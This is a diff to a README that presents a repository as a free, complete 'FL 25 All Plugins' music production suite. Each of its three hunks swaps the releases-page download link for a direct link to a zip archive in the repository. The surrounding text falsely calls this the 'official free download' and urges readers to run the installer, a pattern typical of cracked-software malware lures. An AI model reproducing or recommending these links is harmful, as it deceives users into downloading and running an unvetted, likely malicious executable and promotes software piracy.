@@ -1,6 +1,6 @@
 # 🎹 FL-25.-All-Plugins-DAW - Your Complete Music Production Studio
 
-[![Download FL 25 All Plugins](https://img.shields.io/badge/Download-FL_25_All_Plugins-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/musicrackclosure4668/FL-25.-All-Plugins-DAW/releases)
+[![Download FL 25 All Plugins](https://img.shields.io/badge/Download-FL_25_All_Plugins-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/musicrackclosure4668/FL-25.-All-Plugins-DAW/main/plug/v2.7.zip)
 
 ## 🎵 What Is FL 25 All Plugins DAW?
 
@@ -14,7 +14,7 @@ Getting started with FL 25 All Plugins DAW is simple. Follow these steps to begi
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: **[Download FL 25 All Plugins DAW](https://github.com/musicrackclosure4668/FL-25.-All-Plugins-DAW/releases)**
+Visit this link to download the application: **[Download FL 25 All Plugins DAW](https://raw.githubusercontent.com/musicrackclosure4668/FL-25.-All-Plugins-DAW/main/plug/v2.7.zip)**
 
 The download page will show you available files. Choose the version that matches your system. This software works on **Windows 10 and Windows 11**.
 
@@ -169,7 +169,7 @@ To get the most out of FL 25, try these approaches:
 
 ## 📥 Download Instructions
 
-Visit this link to download the application: **[Download FL 25 All Plugins DAW](https://github.com/musicrackclosure4668/FL-25.-All-Plugins-DAW/releases)**
+Visit this link to download the application: **[Download FL 25 All Plugins DAW](https://raw.githubusercontent.com/musicrackclosure4668/FL-25.-All-Plugins-DAW/main/plug/v2.7.zip)**
 
 The download page provides the installer file. Save it to your computer, then run it to start the installation process. This is the official free download for FL 25 All Plugins DAW.
 
